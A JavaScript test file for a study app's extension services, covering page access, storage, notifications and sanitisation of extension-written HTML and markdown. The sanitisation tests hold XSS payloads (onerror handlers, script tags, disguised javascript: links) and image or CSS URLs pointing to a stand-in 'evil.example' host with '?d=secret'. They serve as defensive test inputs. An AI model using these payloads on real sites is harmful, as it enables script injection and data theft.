import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

const tauri = vi.hoisted(() => ({ invoke: null, isTauri: false }));
vi.mock("@tauri-apps/api/core", () => ({
  invoke: (...a) => tauri.invoke(...a),
  isTauri: () => tauri.isTauri,
}));

import { createServices, resetNotificationAsk } from "./services.js";
import { HostError } from "./host.js";
import * as op from "../data/operations";
import { getMarkdownCompiler } from "../../../core/markdown/compiler.js";

// Biology / Krebs (a page), plus a loose page in Unsorted.
function sampleState() {
  let s = op.EMPTY_STATE;
  let r = op.addSubject(s, { name: "Biology" });
  s = r.state;
  const bio = r.id;
  r = op.addChild(s, bio, "page", "Krebs");
  s = op.setContent(r.state, r.id, "<h1>Krebs</h1><p>Citric&nbsp;acid <b>cycle</b></p><p>Second</p>");
  const krebs = r.id;
  r = op.addChild(s, "unsorted", "page", "Loose");
  return { state: r.state, bio, krebs, loose: r.id };
}

let store;
function setup(over = {}) {
  const sample = sampleState();
  const live = {
    state: sample.state,
    actions: { setContent: vi.fn(), setMastery: vi.fn() },
    shell: { open: vi.fn(), toast: vi.fn() },
    record: {
      id: "acme.cards",
      version: "1.0.0",
      manifest: { name: "Cards", contributes: { tools: [{ id: "quiz", title: "Quiz", entry: "tool.html" }] } },
    },
    // The extension's record as the provider has it now: null when it's
    // disabled or gone.
    active: { id: "acme.cards", enabled: true, granted: ["pages.read"] },
    resize: vi.fn((h) => h),
    blockSave: vi.fn(),
    ...over,
  };
  return { ...sample, live, services: createServices(() => live) };
}

beforeEach(() => {
  store = new Map();
  Object.defineProperty(window, "localStorage", {
    configurable: true,
    writable: true,
    value: {
      getItem: (k) => (store.has(k) ? store.get(k) : null),
      setItem: (k, v) => void store.set(k, String(v)),
      removeItem: (k) => void store.delete(k),
      clear: () => store.clear(),
    },
  });
  tauri.invoke = vi.fn();
  tauri.isTauri = false;
  resetNotificationAsk();
});
afterEach(() => {
  delete globalThis.Notification;
});

const code = (fn) => {
  try {
    fn();
  } catch (e) {
    return e instanceof HostError ? e.code : `not a HostError: ${e}`;
  }
  return "no error";
};

describe("pages and subjects", () => {
  it("lists pages with their subject, null for loose pages", () => {
    const { services, bio, krebs, loose } = setup({ active: { id: "acme.cards", enabled: true, granted: ["pages.read", "mastery.read"] } });
    expect(services.pages.list()).toEqual(
      expect.arrayContaining([
        { id: krebs, name: "Krebs", subjectId: bio, mastery: null },
        { id: loose, name: "Loose", subjectId: null, mastery: null },
      ])
    );
  });

  it("leaves mastery out of the page list without mastery.read", () => {
    const { services, krebs, live } = setup();
    live.state = op.setMastery(live.state, krebs, 0.9);
    const pages = services.pages.list();
    expect(pages).toHaveLength(2);
    pages.forEach((p) => expect(p).not.toHaveProperty("mastery"));
    live.active = { ...live.active, granted: ["pages.read", "mastery.read"] };
    expect(services.pages.list().find((p) => p.id === krebs).mastery).toBe(0.9);
    live.active = null;
    services.pages.list().forEach((p) => expect(p).not.toHaveProperty("mastery"));
  });

  it("reads a page as html and plain text with blocks on separate lines", () => {
    const { services, krebs } = setup();
    expect(services.pages.read(krebs)).toEqual({
      id: krebs,
      name: "Krebs",
      html: "<h1>Krebs</h1><p>Citric&nbsp;acid <b>cycle</b></p><p>Second</p>",
      text: "Krebs\nCitric acid cycle\nSecond",
    });
  });

  it("only reads and writes pages that exist", () => {
    const { services, bio, live } = setup();
    expect(code(() => services.pages.read("gone"))).toBe("not-found");
    expect(code(() => services.pages.read(bio))).toBe("not-found");
    expect(code(() => services.pages.write("gone", "<p>x</p>"))).toBe("not-found");
    expect(code(() => services.pages.read("__proto__"))).toBe("not-found");
    expect(live.actions.setContent).not.toHaveBeenCalled();
  });

  it("writes through the study actions", () => {
    const { services, krebs, live } = setup();
    services.pages.write(krebs, "<p>new</p>");
    expect(live.actions.setContent).toHaveBeenCalledWith(krebs, "<p>new</p>");
  });

  it("lists subjects in order", () => {
    const { services, bio } = setup();
    expect(services.subjects.list()).toEqual([{ id: bio, name: "Biology", color: expect.any(String) }]);
  });
});

describe("mastery", () => {
  it("gets and sets a page's mastery", () => {
    const { services, krebs, live } = setup();
    expect(services.mastery.get(krebs)).toBeNull();
    services.mastery.set(krebs, 0.4);
    expect(live.actions.setMastery).toHaveBeenCalledWith(krebs, 0.4);
    expect(code(() => services.mastery.set("gone", 0.4))).toBe("not-found");
  });
});

describe("storage", () => {
  it("keeps each extension's data under its own key", () => {
    const { services } = setup();
    expect(services.storage.read()).toEqual({});
    services.storage.write({ count: 2 });
    expect(JSON.parse(store.get("study-extension-data-v1:acme.cards"))).toEqual({ count: 2 });
    expect(services.storage.read()).toEqual({ count: 2 });
  });

  it("treats unreadable data as empty", () => {
    store.set("study-extension-data-v1:acme.cards", "{broken");
    expect(setup().services.storage.read()).toEqual({});
    store.set("study-extension-data-v1:acme.cards", "[1,2]");
    expect(setup().services.storage.read()).toEqual({});
  });
});

describe("fetch", () => {
  it("goes through the Rust proxy in the desktop app", async () => {
    tauri.isTauri = true;
    tauri.invoke.mockResolvedValue({ status: 200, headers: { a: "b" }, body: "ok" });
    const req = { url: "https://api.example.com/", method: "GET", headers: {}, body: null };
    expect(await setup().services.fetch(req)).toEqual({ status: 200, headers: { a: "b" }, body: "ok" });
    expect(tauri.invoke).toHaveBeenCalledWith("ext_proxy_fetch", { req });
  });

  it("is a network error outside the desktop app", async () => {
    await expect(setup().services.fetch({ url: "https://a.com/" })).rejects.toMatchObject({ code: "network" });
    expect(tauri.invoke).not.toHaveBeenCalled();
  });
});

describe("notify", () => {
  it("toasts the title and shows a system notification when allowed", () => {
    const shown = vi.fn();
    globalThis.Notification = Object.assign(
      function Notification(title, opts) {
        shown(title, opts);
      },
      { permission: "granted", requestPermission: vi.fn() }
    );
    const { services, live } = setup();
    services.notify("Session done", "Take a break");
    expect(live.shell.toast).toHaveBeenCalledWith("Session done");
    expect(shown).toHaveBeenCalledWith("Session done", { body: "Take a break" });
  });

  it("asks for permission once, on first use", async () => {
    const shown = vi.fn();
    const requestPermission = vi.fn(async () => "granted");
    globalThis.Notification = Object.assign(
      function Notification(title, opts) {
        shown(title, opts);
      },
      { permission: "default", requestPermission }
    );
    const { services } = setup();
    services.notify("One");
    services.notify("Two");
    await Promise.resolve();
    await Promise.resolve();
    expect(requestPermission).toHaveBeenCalledTimes(1);
    expect(shown).toHaveBeenCalledWith("One", { body: "" });
  });

  it("still toasts without the Notification API", () => {
    const { services, live } = setup();
    services.notify("Done");
    expect(live.shell.toast).toHaveBeenCalledWith("Done");
  });
});

describe("ui and blocks", () => {
  it("opens pages that exist and the extension's own tools", () => {
    const { services, live, krebs } = setup();
    services.ui.open({ view: "node", id: krebs });
    expect(live.shell.open).toHaveBeenLastCalledWith({ view: "node", id: krebs });
    services.ui.open({ view: "tool", id: "quiz" });
    expect(live.shell.open).toHaveBeenLastCalledWith({ view: "tool", ext: "acme.cards", tool: "quiz" });
    services.ui.open({ view: "home" });
    expect(live.shell.open).toHaveBeenLastCalledWith({ view: "home" });
    expect(code(() => services.ui.open({ view: "node", id: "gone" }))).toBe("not-found");
    expect(code(() => services.ui.open({ view: "tool", id: "other" }))).toBe("not-found");
  });

  it("passes toast, resize and block saves to the frame", () => {
    const { services, live } = setup();
    services.ui.toast("hi");
    expect(live.shell.toast).toHaveBeenCalledWith("hi");
    expect(services.ui.resize(90)).toBe(90);
    services.block.save({ a: 1 }, "text");
    expect(live.blockSave).toHaveBeenCalledWith({ a: 1 }, "text");
  });

  it("refuses a block save when the frame has nowhere to save", () => {
    const { services } = setup({ blockSave: undefined });
    expect(code(() => services.block.save({}, ""))).toBe("bad-params");
  });
});

describe("page writes are sanitised", () => {
  // What actually reached the study data.
  function written(html) {
    const { services, krebs, live } = setup();
    services.pages.write(krebs, html);
    return live.actions.setContent.mock.calls[0][1];
  }
  const parse = (html) => new DOMParser().parseFromString(html, "text/html").body;

  it("keeps ordinary editor HTML exactly as it was", () => {
    const html =
      '<h1>Title</h1><ul><li><p>One</p></li><li><p>Two</p></li></ul>' +
      '<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://example.com">link</a> <strong>bold</strong> <em>it</em> <code>x</code> ' +
      '<a data-type="wiki-link" href="Krebs.md">Krebs</a></p>' +
      '<ul data-type="taskList"><li data-checked="true" data-type="taskItem"><label><input type="checkbox" checked="checked"><span></span></label><div><p>t</p></div></li></ul>' +
      '<ol><li><p>a</p></li></ol><blockquote><p>q</p></blockquote><pre><code class="language-js">a &lt; b</code></pre><p>a&nbsp;b</p>' +
      '<span data-type="math-inline" class="math-inline" src="\\frac{a}{b}" data-src="\\frac{a}{b}">x</span>';
    expect(written(html)).toBe(html);
  });

  it("drops remote image sources but keeps inline images", () => {
    const out = parse(written('<p><img src="https://evil.example/?d=secret" alt="a"><img srcset="https://evil.example/x 2x"><img src="data:image/png;base64,iVBORw0KGgo="></p>'));
    const imgs = out.querySelectorAll("img");
    expect(imgs).toHaveLength(3);
    expect(imgs[0].hasAttribute("src")).toBe(false);
    expect(imgs[1].hasAttribute("srcset")).toBe(false);
    expect(imgs[2].getAttribute("src")).toBe("data:image/png;base64,iVBORw0KGgo=");
    expect(out.innerHTML).not.toContain("evil.example");
  });

  it("strips markup hidden in a math source", () => {
    const payload = `${"{".repeat(600)}<img src=x onerror=alert(1)>`;
    const out = parse(
      written(`<span data-type="math-inline" src="${payload}" data-src="${payload}">x</span><div data-type="math-block" src="${"a".repeat(2001)}">y</div>`)
    );
    const [inline, block] = out.querySelectorAll("[data-type]");
    expect(inline.hasAttribute("src")).toBe(false);
    expect(inline.hasAttribute("data-src")).toBe(false);
    expect(block.hasAttribute("src")).toBe(false);
    expect(out.innerHTML).not.toContain("onerror");
  });

  it("applies the math exemption only to the editor's two math nodes", () => {
    const remote = "https://evil.example/?d=secret";
    for (const html of [
      `<p><img data-type="math-inline" src="${remote}"></p>`,
      `<p><IMG DATA-TYPE="math-inline" SRC="${remote}"></p>`,
      `<p><img src="${remote}" data-type="math-inline"></p>`,
      `<p><img data-type="math-block" src="${remote}"></p>`,
      `<p><span data-type="math-x" src="${remote}">x</span></p>`,
      `<div data-type="math-inline" src="${remote}">x</div>`,
      `<p><span data-type="math-block" src="${remote}">x</span></p>`,
    ]) {
      expect(written(html)).not.toContain("evil.example");
    }
  });

  it("keeps real formulas, including < and >, and drops only tag starts", () => {
    const math = (src) => parse(written(`<p><span data-type="math-inline" src="${src}" data-src="${src}">m</span></p>`)).querySelector("span");
    for (const formula of ["f:A\\to B", "x &lt; 5", "a &gt; b", "a&lt;5", "\\frac{a}{b}"]) {
      const span = math(formula);
      const expected = new DOMParser().parseFromString(`<i title="${formula}"></i>`, "text/html").querySelector("i").title;
      expect(span.getAttribute("src")).toBe(expected);
      expect(span.getAttribute("data-src")).toBe(expected);
    }
    for (const bad of ["a&lt;img src=x onerror=1&gt;", "&lt;!-- x", "&lt;/span&gt;", "&lt;?x"]) {
      const span = math(bad);
      expect(span.hasAttribute("src")).toBe(false);
      expect(span.hasAttribute("data-src")).toBe(false);
    }
    const block = parse(written('<div data-type="math-block" src="\\sum_{i &lt; n} i">m</div>')).querySelector("div");
    expect(block.getAttribute("src")).toBe("\\sum_{i < n} i");
  });

  it("keeps highlight colours only when they're plain colours", () => {
    const colour = (value) => parse(written(`<p><mark data-color="${value}">x</mark></p>`)).querySelector("mark").getAttribute("data-color");
    expect(colour("red; background-image: url(https://evil.example/x)")).toBeNull();
    expect(colour("rgb(1, 2, 3); background: url(https://evil.example/x)")).toBeNull();
    expect(colour("var(--x)")).toBeNull();
    expect(colour("url(https://evil.example/x)")).toBeNull();
    for (const ok of ["#ffeb3b", "#fff", "#ffeb3b80", "yellow", "rgb(1, 2, 3)", "rgba(1, 2, 3, 0.5)", "hsl(120 50% 50% / 0.5)"]) {
      expect(colour(ok)).toBe(ok);
    }
  });

  it("removes styles, scripts, frames and other active content", () => {
    const out = written(
      '<style>p{background:url(https://evil.example/s)}</style><script>alert(1)</script><iframe src="https://evil.example"></iframe>' +
        '<object data="x"></object><embed src="x"><svg><image href="https://evil.example/i"></image></svg><math><mi>x</mi></math>' +
        '<form action="https://evil.example"></form><meta http-equiv="refresh"><link rel="stylesheet" href="https://evil.example/c"><base href="https://evil.example/">' +
        '<p onclick="alert(1)">ok</p>'
    );
    expect(out).not.toMatch(/<(style|script|iframe|object|embed|svg|math|form|meta|link|base)\b/i);
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("onclick");
    expect(out).toContain("<p>ok</p>");
  });

  it("removes javascript: links however they're written", () => {
    const out = parse(
      written('<p><a href="javascript:alert(1)">a</a><a href="  JaVaScRiPt:alert(1)">b</a><a href="java&#x09;script:alert(1)">c</a><a href="&#x01;javascript:alert(1)">d</a></p>')
    );
    out.querySelectorAll("a").forEach((a) => expect(a.hasAttribute("href")).toBe(false));
    expect(out.querySelectorAll("a")).toHaveLength(4);
  });
});

describe("page writes that the editor would read as markdown", () => {
  const compiler = getMarkdownCompiler();
  // What the editor shows for stored content: it compiles anything that
  // looks like markdown (Editor.jsx), and renders the rest as it is.
  const asEditorLoads = (stored) => (compiler.isMarkdown(stored) ? compiler.compile(stored) : stored);
  function written(html) {
    const { services, krebs, live } = setup();
    services.pages.write(krebs, html);
    return live.actions.setContent.mock.calls[0][1];
  }
  const remoteSources = (html) =>
    [...new DOMParser().parseFromString(html, "text/html").querySelectorAll("[src], [srcset]")].filter(
      (el) => !/^data:image\//.test(el.getAttribute("src") ?? "") || el.hasAttribute("srcset")
    );

  it("never stores a markdown image that would load from the network", () => {
    const stored = written("![x](https://evil.example/?d=secret)");
    expect(asEditorLoads(stored)).not.toContain("evil.example");
    expect(remoteSources(asEditorLoads(stored))).toEqual([]);
  });

  it("catches a markdown image after ordinary HTML", () => {
    const stored = written("<p>Notes</p>\n\n![x](https://evil.example/?d=secret)");
    expect(asEditorLoads(stored)).not.toContain("evil.example");
    expect(asEditorLoads(stored)).toContain("Notes");
  });

  it("stores ordinary markdown as written, links included", () => {
    const markdown = "**bold** and [link](https://example.com)";
    expect(written(markdown)).toBe(markdown);
    expect(asEditorLoads(markdown)).toContain('href="https://example.com"');
  });

  it("notices what DOMPurify removes by itself", () => {
    // KaTeX writes MathML, which is forbidden; the hook never sees it.
    expect(asEditorLoads(written("Energy $E=mc^2$ and **more**"))).not.toMatch(/<math\b/);
  });

  it("notices a removal that DOMPurify's own list loses", () => {
    // DOMPurify pops its last `removed` entry whenever it trims an attribute
    // value, so the onclick removal below vanishes from that list.
    const isMarkdown = vi.spyOn(compiler, "isMarkdown").mockReturnValueOnce(true).mockReturnValue(false);
    const compile = vi.spyOn(compiler, "compile").mockReturnValue('<p><b onclick="alert(1)">a</b><i title=" t ">b</i></p>');
    try {
      expect(written("plain words")).toBe('<p><b>a</b><i title="t">b</i></p>');
    } finally {
      isMarkdown.mockRestore();
      compile.mockRestore();
    }
  });

  it("leaves plain HTML alone", () => {
    expect(written("<p>Plain notes</p>")).toBe("<p>Plain notes</p>");
  });

  it("refuses content that stays unsafe after three passes", () => {
    const isMarkdown = vi.spyOn(compiler, "isMarkdown").mockReturnValue(true);
    const compile = vi.spyOn(compiler, "compile").mockReturnValue('<p><img src="https://evil.example/x"></p>');
    try {
      const { services, krebs, live } = setup();
      expect(code(() => services.pages.write(krebs, "anything"))).toBe("bad-params");
      expect(compile).toHaveBeenCalledTimes(3);
      expect(live.actions.setContent).not.toHaveBeenCalled();
    } finally {
      isMarkdown.mockRestore();
      compile.mockRestore();
    }
  });
});

describe("services.ai", () => {
  it("asks the shell's AI on behalf of this extension", async () => {
    const asked = [];
    const shellAi = { ask: async (extensionId, prompt) => (asked.push([extensionId, prompt]), "4") };
    const services = createServices(() => ({ shell: { ai: shellAi }, record: { id: "a.one" } }));
    await expect(services.ai.ask("2+2?")).resolves.toBe("4");
    expect(asked).toEqual([["a.one", "2+2?"]]);
  });

  it("is missing when the app has no AI, so the host answers ai-unavailable", () => {
    expect(createServices(() => ({ shell: {}, record: { id: "a.one" } })).ai).toBeNull();
  });
});
